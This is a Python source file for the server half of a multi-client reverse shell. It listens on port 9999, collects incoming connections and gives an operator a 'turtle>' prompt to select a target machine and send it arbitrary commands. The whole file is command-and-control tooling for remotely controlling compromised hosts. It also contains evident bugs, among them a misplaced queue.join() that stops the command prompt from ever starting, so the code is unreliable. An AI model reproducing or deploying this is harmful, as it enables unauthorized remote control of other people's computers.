import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []



# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global soket
        host = ''
        port = 9999
        soket= socket.socket()
    except socket.error as msg:
        print('Socket creation error : ' + str(msg))

# Binding the Socket and Listening for connections
def bind_socket():
    try:
        global host
        global port
        global soket

        print('Binding the port : '+ str(port))

        soket.bind((host, port))
        soket.listen(5)

    except socket.error as msg:
        print('Socket binding error : '+ str(msg) + '\n' + 'Retrying.....')
        bind_socket()

# #Handlig connections from multiple clients and saving to a list

# Closing previous connections when server.py file is restarted

def  accepting_connections():
    for con in all_connections:
        con.close()

        del all_connections[:]
        del all_address[:]

    while True:
        try:
            conn, addr = soket.accept()
            soket.setblocking(1)    # pevents timeout

            all_connections.append(conn)
            all_address.append(addr)

            print('Connection has been etablished : '+ addr[0])

        except:
            print('Error while accepting the connections !')

# 2nd Thread Functions - 1)See all the clients 2)Select a client 3)Send commands to the connected client

# Interactive Prompt for sending commands
# turtle>list
# 0 Client A
# 1 Client B
# 2 Client C
# turtle>select 1

def start_turtle():

    while True:
            cmd = input('turtle>')

            if cmd == 'list':
                list_connections()
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)
            else:
                print('Command is not recognized !')

# Display all current active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + '    ' + str(all_address[i][0]) + '     ' + str(all_address[i][1]) + '\n'

    print('----------Client-----------' + '\n' + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to :' + str(all_address[target][0]))
        print(str(all_address[target][0]) + '>' , end='')
        return conn
    except:
        print('Selection is no valid.')
        return None

# Send commands to a client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd))> 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(9999999), 'utf-8')
                print(client_response, end='')
        except:
            print('Error in sending commands !')
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job i.e. in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

        queue.join()

create_workers()
create_jobs()